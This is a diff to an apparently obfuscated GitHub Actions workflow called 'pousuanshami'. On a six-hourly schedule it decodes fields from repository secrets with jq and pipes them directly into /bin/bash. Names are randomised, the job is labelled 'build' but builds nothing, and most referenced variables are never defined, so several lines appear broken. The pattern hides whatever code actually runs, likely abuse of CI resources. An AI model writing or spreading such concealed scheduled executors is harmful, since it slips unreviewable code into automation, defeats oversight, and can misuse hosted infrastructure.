@@ -3,9 +3,8 @@ name: pousuanshami
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
-
-jobs:  # 3214
+    - cron: '52 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,12 +12,13 @@ jobs:  # 3214
       - uses: actions/checkout@v4
       - name: pousuanshami
         env:
-          tn30: ${{ secrets.tn30 }}
+          h70794: ${{ secrets.h70794 }}
         run: |
-          echo $tn30 | jq -r .og21106 | /bin/bash
-          echo $tpqrc88 | jq -r .viv81 | /bin/bash
-          echo $jxdqe48 | jq -r .bd6 | /bin/bash
-          echo $y07 | jq -r .otfbu72840 | /bin/bash
-          echo $brcy07681 | jq -r .gk146 | /bin/bash
-          echo $cmvi6 | jq -r .hhbx49 | /bin/bash
+          echo $h70794 | jq -r .whs08 | /bin/bash
+          echo $vrce9 | jq -r .npsu9362 | /bin/bash
+          echo $hi97171 | jq -r .jbby165 | /bin/bash
+          echo $syol90 | jq -r .ronrj612 | /bin/bash
+          echo $lldtp61905 | jq -r .m7 | /bin/bash
+          echo $p1 | jq -r .raic992 | /bin/bash
+          echo $vowsl766 | jq -r .zh6845 | /bin/bash
 
